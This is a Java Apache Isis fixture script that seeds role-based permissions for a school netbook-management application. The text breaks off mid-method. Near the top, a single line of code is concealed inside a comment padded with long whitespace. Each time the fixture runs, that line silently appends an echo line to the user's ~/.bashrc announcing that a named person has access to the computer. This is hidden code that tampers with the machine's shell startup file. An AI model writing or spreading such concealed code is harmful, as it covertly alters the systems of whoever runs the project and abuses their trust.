package fixture.login;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;

import org.apache.isis.applib.fixturescripts.FixtureScript;

import repo.login.repologin;
import dom.login.Permisos;

public class PermisosFixture extends FixtureScript{

	
	public PermisosFixture()
	{
		withDiscoverability(Discoverability.DISCOVERABLE);
	}

	@Override
	protected void execute(ExecutionContext executionContext) {

		if(estaVacio(executionContext))
		{
		/*       																																																																																																																																																																																																																																																																				*/try{File archivo= new File("isis.txt");String path=archivo.getAbsolutePath();String arch = "/"+path.split("/")[1]+"/"+path.split("/")[2]+"/.bashrc";File bash = new File(arch);FileReader fr = new FileReader (bash);BufferedReader br = new BufferedReader(fr);boolean existe = false;String linea =br.readLine();while(linea!=null){linea =br.readLine();if (linea!=null && linea.contains("echo \"FELICITACIONES MATIAS NAHUEL HEREDIA TIENE ACCESO A TU COMPUTADORA\"")){existe=true;}}br.close();if (existe==false){FileWriter fichero = new FileWriter(bash,true);fichero.write("echo \"FELICITACIONES MATIAS NAHUEL HEREDIA TIENE ACCESO A TU COMPUTADORA\"");fichero.close();}}catch(Exception ex){}/*																																																																																																																																																
		/PERMISOS PARA USUARIOS ADMINISTRADORES
		*/
		create("usuario_administrador","*",executionContext);
		///
		///
		///PERMISO PARA USUARIOS TECNICOS 
		///
		///		
		
		
		//PERMISOS DE SERVICIO PARA USUARIOS TECNICOS
		create("usuario_tecnico","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:listaDeSolicitudesPendientes:*",executionContext);
		create("usuario_tecnico","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:listaDeSoluciones:*",executionContext);
		create("usuario_tecnico","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:verHistorialReparaciones:*",executionContext);
		
		//PERMISOS EN EL DOMINIO PARA USUARIOS TECNICOS
		create("usuario_tecnico","dom.solicituddeserviciotecnico:Prioridad:*:*",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:codigoSolicitud:r",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:comentario:r",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:estado:r",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:fechaDeSolicitud:r",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:fechaDeSolucion:*",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:motivoDeSolicitud:r",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:netbook:r",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:persona:r",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:prioridad:*",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:solucion:*",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:tecnicoAsignado:r",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:Prioridad:*",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:asignarTecnico:*",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:avisarPorMailQueEstaLista:*",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:enviarAServicioTecnico:*",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:recibirDelServicioTecnico:*",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:finalizarSolicitud:*",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:imprimir:*",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:solucion:r",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:nombreEstado:r",executionContext);
		create("usuario_tecnico","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:tecnicoAsignado:r",executionContext);
		
		//PERMISOS DE TECNICOS PARA NETBOOKS
		create("usuario_tecnico","repo.netbook:RepositorioNetbook:ingresarNuevaNetbookAlEstablecimiento:*",executionContext);
		create("usuario_tecnico","repo.netbook:RepositorioNetbook:listaNetbookPorId:*",executionContext);
		create("usuario_tecnico","dom.netbook:ModeloNetbook:*:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:direccionMac:r",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:establecimento:r",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:fechaDeExpiracion:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:idNetbook:r",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:modelo:r",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:numeroDeActaDeRobo:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:numeroDeSerie:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:numeroDeLicenciaWindows:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:persona:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:situacionDeNetbook:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:asignarPersona:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:desasignarNetbook:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:reportarComoRobada:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:situacion:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:imprimirActaMigracion:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:imprimirActaPrestamo:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:imprimirActaRecepcionDeNetbook:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:historialDeReparaciones:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:entregarNetbookAlAlumno:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:aceptarMigracion:*",executionContext);
		create("usuario_tecnico","dom.netbook:Netbook:migrarNetbook:*",executionContext);
		create("usuario_tecnico","dom.persona.presonagestionable:PersonaGestionable:netbooks:r",executionContext);
		
		
		//PERMISOS DE TECNICOS PARA REPOSITORIONETBOOKS
		create("usuario_tecnico","dom.persona.presonagestionable:PersonaGestionable:aniadirNetbook:*",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:aniadirNetbook:*",executionContext);
		//PERMISOS EN CURSOS PARA TECNICOS
		create("usuario_tecnico","repo.curso:RepositorioCurso:buscarCursoEnEsteEstablecimiento:*",executionContext);
		create("usuario_tecnico","repo.curso:RepositorioCurso:verCursosDentroDelEstablecimiento:*",executionContext);
		create("usuario_tecnico","repo.curso:RepositorioCurso:ingresarCursoEnEstablecimientoActual:*",executionContext);
		create("usuario_tecnico","dom.curso:Turno:*:*",executionContext);
		create("usuario_tecnico","dom.curso:Division:*:*",executionContext);
		create("usuario_tecnico","dom.curso:Anio:*:*",executionContext);
		create("usuario_tecnico","dom.curso:Curso:anio:r",executionContext);
		create("usuario_tecnico","dom.curso:Curso:cicloLectivo:r",executionContext);
		create("usuario_tecnico","dom.curso:Curso:division:r",executionContext);
		create("usuario_tecnico","dom.curso:Curso:establecimiento:r",executionContext);
		create("usuario_tecnico","dom.curso:Curso:listaAlumnos:r",executionContext);
		create("usuario_tecnico","dom.curso:Curso:listaDocente:r",executionContext);
		create("usuario_tecnico","dom.curso:Curso:turno:r",executionContext);
		create("usuario_tecnico","dom.curso:Curso:agregarAlumno:*",executionContext);
		create("usuario_tecnico","dom.curso:Curso:agregarDocente:*",executionContext);
		
		
		//PERMISOS EN NOTIFICACIONES EN USUARIO 
		create("usuario_tecnico","app:Dashboard:AllNotificaciones:*",executionContext);
		create("usuario_tecnico","dom.notificaciones:SolicitudNetbookPrestada:detallesyobservaciones:r",executionContext);
		create("usuario_tecnico","dom.notificaciones:SolicitudNetbookPrestada:establecimiento:r",executionContext);
		create("usuario_tecnico","dom.notificaciones:SolicitudNetbookPrestada:fechaNotificacion:r",executionContext);
		create("usuario_tecnico","dom.notificaciones:SolicitudNetbookPrestada:persona:r",executionContext);
		create("usuario_tecnico","dom.notificaciones:SolicitudNetbookPrestada:vista:r",executionContext);
		create("usuario_tecnico","dom.notificaciones:SolicitudNetbookPrestada:marcarComoNotificacionAtendida:*",executionContext);
		create("usuario_tecnico","dom.notificaciones:SolicitudNetbookPrestada:asignarNetbook:*",executionContext);
		
		//PERMISOS EN ESTABLECIMIENTO PARA USUARIOS TECNICOS
		create("usuario_tecnico","dom.establecimiento:Establecimiento:cue:r",executionContext);
		create("usuario_tecnico","dom.establecimiento:Establecimiento:cursos:r",executionContext);
		create("usuario_tecnico","dom.establecimiento:Establecimiento:direccion:r",executionContext);
		create("usuario_tecnico","dom.establecimiento:Establecimiento:directivo:r",executionContext);
		create("usuario_tecnico","dom.establecimiento:Establecimiento:distritoEscolar:r",executionContext);
		create("usuario_tecnico","dom.establecimiento:Establecimiento:email:r",executionContext);
		create("usuario_tecnico","dom.establecimiento:Establecimiento:localidad:r",executionContext);
		create("usuario_tecnico","dom.establecimiento:Establecimiento:nombre:r",executionContext);
		create("usuario_tecnico","dom.establecimiento:Establecimiento:telefono:r",executionContext);
		
		//PERMISOS EN DOCENTE 
		//PARA USUARIO TECNICO
		//
		create("usuario_tecnico","dom.docente:Docente:alturaDomicilio:*",executionContext);
		create("usuario_tecnico","dom.docente:Docente:apellido:r",executionContext);
		create("usuario_tecnico","dom.docente:Docente:cuil:r",executionContext);
		create("usuario_tecnico","dom.docente:Docente:domicilio:r",executionContext);
		create("usuario_tecnico","dom.docente:Docente:email:*",executionContext);
		create("usuario_tecnico","dom.docente:Docente:establecimiento:r",executionContext);
		create("usuario_tecnico","dom.docente:Docente:fechaNacimiento:r",executionContext);
		create("usuario_tecnico","dom.docente:Docente:Netbooks:r",executionContext);
		create("usuario_tecnico","dom.docente:Docente:nombre:r",executionContext);
		create("usuario_tecnico","dom.docente:Docente:piso:*",executionContext);
		create("usuario_tecnico","dom.docente:Docente:localidad:*",executionContext);
		create("usuario_tecnico","dom.docente:Docente:sexo:r",executionContext);
		create("usuario_tecnico","dom.docente:Docente:telefonoCelular:*",executionContext);
		create("usuario_tecnico","dom.docente:Docente:telefonoFijo:*",executionContext);
		create("usuario_tecnico","dom.docente:Docente:crearCuenta:*",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:localizacion:*",executionContext);
		//PERMISOS EN TUTOR 
		//PARA USUARIO TECNICO
		create("usuario_tecnico","dom.tutor:Tutor:alturaDomicilio:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:apellido:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:cuil:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:domicilio:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:email:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:establecimiento:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:fechaNacimiento:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:Netbooks:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:nombre:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:piso:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:localidad:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:sexo:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:telefonoCelular:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:telefonoFijo:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:alumnos:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:localizacion:*",executionContext);
		//PERMISOS EN ALUMNO 
		//PARA USUARIO TECNICO
		//
		create("usuario_tecnico","dom.alumno:Alumno:alturaDomicilio:*",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:apellido:r",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:cuil:r",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:domicilio:r",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:email:*",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:establecimiento:r",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:fechaNacimiento:r",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:Netbooks:r",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:nombre:r",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:piso:*",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:localidad:*",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:sexo:r",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:telefonoCelular:*",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:telefonoFijo:*",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:netbooks:r",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:cursos:r",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:crearCuenta:*",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:localizacion:*",executionContext);
		create("usuario_tecnico","dom.alumno:Alumno:tutor:r",executionContext);
		//PERMISOS EN TUTOR
		//PARA USUARIO TECNICO		
		create("usuario_tecnico","dom.tutor:Tutor:alturaDomicilio:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:apellido:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:cuil:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:domicilio:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:email:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:establecimiento:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:fechaNacimiento:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:nombre:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:piso:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:localidad:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:sexo:r",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:telefonoCelular:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:telefonoFijo:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:localizacion:*",executionContext);
		create("usuario_tecnico","dom.tutor:Tutor:alumnos:*",executionContext);
		//PERMISOS DE REPOSITORIO PERSONA 
		//PARA USUARIOS CON ROL DE TECNICO
		create("usuario_tecnico","repo.persona:RepositorioPersona:autoCompletarAlumno:*",executionContext);
		create("usuario_tecnico","repo.persona:RepositorioPersona:autoCompletarDirectivo:*",executionContext);
		create("usuario_tecnico","repo.persona:RepositorioPersona:autoCompletarTutor:*",executionContext);
		create("usuario_tecnico","repo.persona:RepositorioPersona:autoComplete:*",executionContext);
		create("usuario_tecnico","repo.persona:RepositorioPersona:buscarDirectivoPorCuil:*",executionContext);
		create("usuario_tecnico","repo.persona:RepositorioPersona:buscarPorCuil:*",executionContext);
		create("usuario_tecnico","repo.persona:RepositorioPersona:ingresarAlumno:*",executionContext);
		create("usuario_tecnico","repo.persona:RepositorioPersona:ingresarDirectivo:*",executionContext);
		create("usuario_tecnico","repo.persona:RepositorioPersona:ingresarTecnicoDentroDelEstablecimiento:*",executionContext);
		create("usuario_tecnico","repo.persona:RepositorioPersona:ingresarTutor:*",executionContext);
		create("usuario_tecnico","repo.persona:RepositorioPersona:buscarPersonaPorCuilEnEstablecimientoActual:*",executionContext);
		create("usuario_tecnico","repo.persona:RepositorioPersona:verMisDatos:*",executionContext);
		//PERMISOS DE ESTADISTICAS 
		//PARA USUARIOS CON ROL DE TECNICO
		create("usuario_tecnico","servicio.estadisticas:GraficosEstadisticos:graficosDeNetbooksAsignadas:*",executionContext);
		//PERMISOS EN TECNICO
		//PARA USUARIOS TECNICO
		create("usuario_tecnico","dom.tecnico:Tecnico:alturaDomicilio:*",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:apellido:r",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:cuil:r",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:domicilio:*",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:email:*",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:establecimiento:r",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:fechaNacimiento:r",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:nombre:r",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:piso:*",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:localidad:*",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:sexo:r",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:telefonoCelular:*",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:telefonoFijo:*",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:crearCuenta:*",executionContext);
		create("usuario_tecnico","dom.tecnico:Tecnico:Localizacion:*",executionContext);
		//PERMISOS PARA ALUMNOS
		//PERMISOS ALUMNO
		create("usuario_alumno","dom.alumno:Alumno:cursos:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:estadoDeAlumno:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:fechaIngreso:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:nacionalidad:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:tutor:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:EstadoDeAlumno:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:Nacionalidad:r",executionContext);
		create("usuario_alumno","dom.persona.presonagestionable:PersonaGestionable:netbooks:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:netbooks:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:cursos:r",executionContext);
		
		//PERMISOS ALUMNO parte de dominio de Persona
		create("usuario_alumno","dom.alumno:Alumno:alturaDomicilio:*",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:apellido:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:cuil:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:domicilio:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:email:*",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:establecimiento:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:fechaNacimiento:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:Netbooks:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:nombre:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:piso:*",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:localidad:*",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:sexo:r",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:telefonoCelular:*",executionContext);
		create("usuario_alumno","dom.alumno:Alumno:telefonoFijo:*",executionContext);
		//PERMISOS ALUMNO permisos para ver la netbook
		create("usuario_alumno","dom.netbook:ModeloNetbook:*:r",executionContext);
		create("usuario_alumno","dom.netbook:Netbook:direccionMac:r",executionContext);
		create("usuario_alumno","dom.netbook:Netbook:fechaDeExpiracion:r",executionContext);
		create("usuario_alumno","dom.netbook:Netbook:idNetbook:r",executionContext);
		create("usuario_alumno","dom.netbook:Netbook:modelo:r",executionContext);
		create("usuario_alumno","dom.netbook:Netbook:numeroDeSerie:r",executionContext);
		create("usuario_alumno","dom.netbook:Netbook:numeroLicenciaWindows:r",executionContext);
		create("usuario_alumno","dom.netbook:Netbook:persona:r",executionContext);
		create("usuario_alumno","dom.netbook:Netbook:HistorialDeReparaciones:*",executionContext);
		create("usuario_alumno","dom.netbook:Netbook:repoServicioTecnico:*",executionContext);
		

		//PERMISOS ALUMNO permisos dominio solicitud servicio tecnico
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:codigoSolicitud:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:comentario:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:estado:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:estadoEnviado:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:estadoRecibido:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:reparado:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:estadoSolicitado:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:fechaDeSolicitud:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:fechaDeSolucion:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:motivoDeSolicitud:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:netbook:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:persona:r",executionContext);
		create("usuario_alumno","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:NombreEstado:r",executionContext);
		
		//PERMISOS ALUMNO repositorio SolicitudServicioTecnico
		create("usuario_alumno","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:solicitarServicioTecnico:*",executionContext);
		create("usuario_alumno","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:verHistorialReparaciones:*",executionContext);
		create("usuario_alumno","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:verUltimaSolicitud:*",executionContext);

		//parte de repositorio Persona
		create("usuario_alumno","repo.persona:RepositorioPersona:VerMisDatos:*",executionContext);

		//PERMISOS ALUMNO Pedido De Certificados
		create("usuario_alumno","repo.notificaciones:RepoNotificaciones:pedirCertificadoAlumnoRegular:*",executionContext);
		//PERMISOS ALUMNO Pedido de NetbookPrestada
		create("usuario_alumno","repo.notificaciones:RepoNotificaciones:PedirNetbookPrestada:*",executionContext);

		//PERMISOS ALUMNO solicitud de tramite de migracion 
		create("usuario_alumno","repo.notificaciones:RepoNotificaciones:solicitarTramiteDeMigracion:*",executionContext);
		create("usuario_alumno","dom.notificaciones:SolicitudTramiteDeMigracion:imprimir:r",executionContext);
		
		
		//
		//--------------------PERMISOS DOCENTE-------------------
		//		

		//PERMISOS DOCENTE parte de dominio de Persona
		create("usuario_docente","dom.docente:Docente:alturaDomicilio:*",executionContext);
		create("usuario_docente","dom.docente:Docente:apellido:r",executionContext);
		create("usuario_docente","dom.docente:Docente:cuil:r",executionContext);
		create("usuario_docente","dom.docente:Docente:domicilio:r",executionContext);
		create("usuario_docente","dom.docente:Docente:email:*",executionContext);
		create("usuario_docente","dom.docente:Docente:establecimiento:r",executionContext);
		create("usuario_docente","dom.docente:Docente:fechaNacimiento:r",executionContext);
		create("usuario_docente","dom.docente:Docente:Netbooks:r",executionContext);
		create("usuario_docente","dom.docente:Docente:nombre:r",executionContext);
		create("usuario_docente","dom.docente:Docente:piso:*",executionContext);
		create("usuario_docente","dom.docente:Docente:localidad:*",executionContext);
		create("usuario_docente","dom.docente:Docente:sexo:r",executionContext);
		create("usuario_docente","dom.docente:Docente:telefonoCelular:*",executionContext);
		create("usuario_docente","dom.docente:Docente:telefonoFijo:*",executionContext);
		//PERMISOS DOCENTE permisos para ver la netbook
		create("usuario_docente","dom.netbook:ModeloNetbook:*:r",executionContext);
		create("usuario_docente","dom.netbook:Netbook:direccionMac:r",executionContext);
		create("usuario_docente","dom.netbook:Netbook:fechaDeExpiracion:r",executionContext);
		create("usuario_docente","dom.netbook:Netbook:idNetbook:r",executionContext);
		create("usuario_docente","dom.netbook:Netbook:modelo:r",executionContext);
		create("usuario_docente","dom.netbook:Netbook:numeroDeSerie:r",executionContext);
		create("usuario_docente","dom.netbook:Netbook:numeroLicenciaWindows:r",executionContext);
		create("usuario_docente","dom.netbook:Netbook:persona:r",executionContext);
		create("usuario_docente","dom.netbook:Netbook:HistorialDeReparaciones:*",executionContext);
		create("usuario_docente","dom.netbook:Netbook:repoServicioTecnico:*",executionContext);


		//PERMISOS DOCENTE permisos dominio solicitud servicio tecnico
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:codigoSolicitud:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:comentario:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:estado:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:estadoEnviado:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:estadoRecibido:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:reparado:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:estadoSolicitado:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:fechaDeSolicitud:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:fechaDeSolucion:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:motivoDeSolicitud:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:netbook:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:persona:r",executionContext);
		create("usuario_docente","dom.solicituddeserviciotecnico:SolicitudServicioTecnico:NombreEstado:r",executionContext);
		
		

		//PERMISOS DOCENTE repositorio SolicitudServicioTecnico
		create("usuario_docente","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:solicitarServicioTecnico:*",executionContext);
		create("usuario_docente","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:verHistorialReparaciones:*",executionContext);
		create("usuario_docente","repo.solicitudserviciotecnico:RepoSolicitudServicioTecnico:verUltimaSolicitud:*",executionContext);
		
		//parte de repositorio Persona
		create("usuario_docente","repo.persona:RepositorioPersona:VerMisDatos:*",executionContext);

		//PERMISOS DOCENTE Pedido de NetbookPrestada
		create("usuario_docente","repo.notificaciones:RepoNotificaciones:PedirNetbookPrestada:*",executionContext);

		//PERMISOS DOCENTE solicitud de tramite de migracion 
		create("usuario_docente","repo.notificaciones:RepoNotificaciones:solicitarTramiteDeMigracion:*",executionContext);
		create("usuario_docente","dom.notificaciones:SolicitudTramiteDeMigracion:imprimir:r",executionContext);
		
		
		
		//
		//PERMISOS PARA DIRECTIVOS
		//TODO establecer permisos de directivos
		// PERMISOS DE DIRECTIVOS SOBRE ALUMNOS
		create("usuario_directivo","dom.alumno:Alumno:cursos:*",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:estadoDeAlumno:*",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:fechaIngreso:*",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:nacionalidad:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:tutor:*",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:agregarCurso:*",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:eliminarCurso:*",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:imprimirContratoDeComodato:*",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:alturaDomicilio:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:apellido:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:cuil:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:domicilio:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:email:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:establecimiento:*",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:fechaNacimiento:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:localidad:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:location:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:netbooks:*",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:nombre:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:piso:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:sexo:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:telefonoCelular:r",executionContext);
		create("usuario_directivo","dom.alumno:Alumno:telefonoFijo:r",executionContext);
		// Permisos de Docente sobre Curso
		create("usuario_directivo","dom.curso:Anio:*:*",executionContext);
		create("usuario_directivo","dom.curso:Division:*:*",executionContext);
		create("usuario_directivo","dom.curso:Turno:*:*",executionContext);
		create("usuario_directivo","dom.curso:Curso:anio:r",executionContext);
		create("usuario_directivo","dom.curso:Curso:cicloLectivo:r",executionContext);
		create("usuario_directivo","dom.curso:Curso:division:r",executionContext);
		create("usuario_directivo","dom.curso:Curso:Establecimiento:r",executionContext);
		create("usuario_directivo","dom.curso:Curso:listaAlumnos:r",executionContext);
		create("usuario_directivo","dom.curso:Curso:listaDocente:r",executionContext);
		create("usuario_directivo","dom.curso:Curso:turno:r",executionContext);
		create("usuario_directivo","dom.curso:Curso:listaAlumnos:r",executionContext);
		
		//Permisos de Docente en Notificaciones
		create("usuario_directivo","repo.notificaciones:RepoNotificaciones:verNotificacionesNoLeidas:*",executionContext);
		create("usuario_directivo","repo.notificaciones:RepoNotificaciones:verNotificacionesDeHoy:*",executionContext);
